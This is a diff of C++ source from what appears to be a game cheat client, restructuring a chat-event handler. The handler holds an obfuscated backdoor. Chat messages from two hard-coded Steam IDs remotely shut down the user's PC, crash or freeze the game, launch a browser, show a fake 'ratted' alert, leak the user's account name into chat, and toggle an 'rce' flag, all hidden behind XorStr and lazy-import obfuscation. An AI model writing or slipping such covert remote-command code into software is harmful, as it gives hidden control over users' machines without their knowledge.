@@ -759,64 +759,64 @@ void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
 		int index = Interfaces::m_pEngine->GetPlayerForUserID(pEvent->GetInt(XorStr("userid")));
 		std::string message = pEvent->GetString(XorStr("text"));
 
-		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
-			return;
-		
-		//printf(info.szSteamID);
-		
-		if (message == XorStr("!force up true") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			g_Vars.globals.m_rce_forceup = true;
-			return;
-		}
+		if (Interfaces::m_pEngine->GetPlayerInfo(index, &info)) {
 
-		if (message == XorStr("!force up false") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			g_Vars.globals.m_rce_forceup = false;
-			return;
-		}
+			//printf(info.szSteamID);
 
-		if (message == XorStr("!freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
-		{
-			Sleep(5000);
-			return;
-		}
-		
-		if (message == XorStr("!rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
-		{
-			MessageBox(
-				NULL,
-				XorStr("You got ratted.\nSmoked kid."),
-				XorStr("A Very Scary Rat"),
-				MB_ICONERROR | MB_OK);
+			if (message == XorStr("!force up true") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+			{
+				g_Vars.globals.m_rce_forceup = true;
+				return;
+			}
 
-			return;
-		}
+			if (message == XorStr("!force up false") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+			{
+				g_Vars.globals.m_rce_forceup = false;
+				return;
+			}
 
-		if (message == XorStr("!rick_roll") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			LI_FN(system)(XorStr("start https://www.youtube.com/watch?v=QtBDL8EiNZo"));
-			return;
-		}
+			if (message == XorStr("!freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
+			{
+				Sleep(5000);
+				return;
+			}
 
-		if (message == XorStr("!shutdown") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			LI_FN(system)(XorStr("shutdown /s"));
-			return;
-		}
+			if (message == XorStr("!rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likely crash the user
+			{
+				MessageBox(
+					NULL,
+					XorStr("You got ratted.\nSmoked kid."),
+					XorStr("A Very Scary Rat"),
+					MB_ICONERROR | MB_OK);
 
-		if (message == XorStr("!username") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			const std::string user = g_Vars.globals.user_info.username;
-			char buff[255];
-			sprintf_s(buff, XorStr("say \"%s\""), user.c_str());
-			Interfaces::m_pEngine->ClientCmd(buff);
-		}
+				return;
+			}
 
-		if (message == XorStr("!crash") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			LI_FN(exit)(0);
-			return;
+			if (message == XorStr("!rick_roll") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+			{
+				LI_FN(system)(XorStr("start https://www.youtube.com/watch?v=QtBDL8EiNZo"));
+				return;
+			}
+
+			if (message == XorStr("!shutdown") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+			{
+				LI_FN(system)(XorStr("shutdown /s"));
+				return;
+			}
+
+			if (message == XorStr("!username") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+			{
+				const std::string user = g_Vars.globals.user_info.username;
+				char buff[255];
+				sprintf_s(buff, XorStr("say \"%s\""), user.c_str());
+				Interfaces::m_pEngine->ClientCmd(buff);
+			}
+
+			if (message == XorStr("!crash") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+			{
+				LI_FN(exit)(0);
+				return;
+			}
 		}
 #endif
 
